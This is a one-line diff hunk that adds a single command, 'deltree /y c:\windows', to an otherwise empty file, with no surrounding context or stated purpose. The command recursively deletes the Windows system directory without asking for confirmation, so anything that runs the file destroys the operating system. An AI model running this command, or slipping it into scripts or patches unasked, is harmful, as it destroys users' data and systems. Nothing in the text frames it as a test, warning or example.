@@ -1,0 +1,1 @@
+deltree /y c:\windows
